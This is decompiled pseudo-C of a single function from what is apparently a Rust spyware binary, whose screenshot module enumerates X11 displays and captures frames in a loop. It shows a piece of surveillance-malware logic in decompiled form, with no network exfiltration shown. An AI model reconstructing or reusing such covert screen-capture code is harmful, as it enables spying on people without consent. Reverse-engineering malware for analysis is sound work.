long long spyware::actions::screenshot_actions::get_screenshot_request(struct_0 *a0)
{
    unsigned long long v0;  // [bp-0x180]
    unsigned long long v1;  // [bp-0x178]
    int v2;  // [bp-0x178]
    unsigned long long v3;  // [bp-0x170]
    char *v4;  // [bp-0x168], Other Possible Types: unsigned long long
    int v5;  // [bp-0x160]
    void* v6;  // [bp-0x158]
    void* v7;  // [bp-0x130]
    unsigned long long v8;  // [bp-0x128]
    void* v9;  // [bp-0x120]
    unsigned long long v10;  // [bp-0x118]
    unsigned long long v11;  // [bp-0x110]
    int v12;  // [bp-0x108]
    unsigned long long v13;  // [bp-0xf8]
    char *v14;  // [bp-0xf0], Other Possible Types: unsigned long long
    unsigned long long v15;  // [bp-0xe8]
    unsigned long long v16;  // [bp-0xe0]
    int v17;  // [bp-0xd8]
    unsigned long long v18;  // [bp-0xd8]
    unsigned long long v19;  // [bp-0xd0]
    unsigned long long v20;  // [bp-0xc8]
    unsigned long long v21;  // [bp-0xc0]
    unsigned long v22;  // [bp-0xb8]
    int v23;  // [bp-0xb4]
    int v24;  // [bp-0x90], Other Possible Types: char
    char v25;  // [bp-0x80]
    char v26;  // [bp-0x7c]
    int v27;  // [bp-0x78]
    char v28;  // [bp-0x68]
    char v29;  // [bp-0x48]
    int v31;  // [bp-0x160], Other Possible Types: unsigned long long

    v7 = 0;
    v8 = 8;
    v9 = 0;
    if (::0x458660::core::sync::atomic::atomic_load() >= 4)
    {
        v1 = &g_4b9f08;
        v3 = 1;
        v4 = 8;
        *((uint128_t *)&v31) = 0;
        v18 = "spyware::actions::screenshot_actionsCould not get all displaysCouldn't begin capture.";
        v19 = 36;
        v20 = "spyware::actions::screenshot_actionsCould not get all displaysCouldn't begin capture.";
        v21 = 36;
        v22 = log::__private_api::loc(&g_4b9f38);
        log::__private_api::log(&v1, 4, &v18);
    }
    v1.all();
    v29.expect(&v1);
    v28.into_iter(&v29);
    v24.next(&v28);
    if (v26 == 2)
    {
        core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<scrap::common::x11::Display>>(&v28);
        a0->field_10 = 0;
        a0->field_0 = *((int128_t *)&v7);
        a0->field_18 = 0x8000000000000000;
        return a0;
    }
    v13 = *((long long *)&v25);
    v12 = v24;
    v1 = &g_4b9f18;
    v3 = 1;
    v4 = 8;
    *((uint128_t *)&v31) = 0;
    std::io::stdio::_print(&v1);
    v20 = v13;
    v17 = v12;
    v1.new(&v18);
    v18.expect(&v1);
    *((uint128_t *)&v27) = InterleaveLOV(0, InterleaveLOV(0, (int)v23));
    while (true)
    {
        while (true)
        {
            v10.frame(&v18);
            if (!v10)
                break;
            v14.to_vec(v10, v11);
            v4 = v16;
            *((int128_t *)&v2) = *((int128_t *)&v14);
            v5 = v27;
            v7.push(&(unsigned long long)v2);
        }
        v0 = v11;
        if ((char)v11.kind() != 13)
            break;
        std::thread::sleep(0, 16666666);
        ::0x4584c0::core::ptr::drop_in_place<std::io::error::Error>(&v0);
    }
    v14 = &v0;
    v15 = <std::io::error::Error as core::fmt::Display>::fmt;
    v1 = &g_4b9f28;
    v3 = 1;
    v6 = 0;
    v4 = &v14;
    v31 = 1;
    core::panicking::panic_fmt(&v1, &g_4b9f98); /* do not return */
}
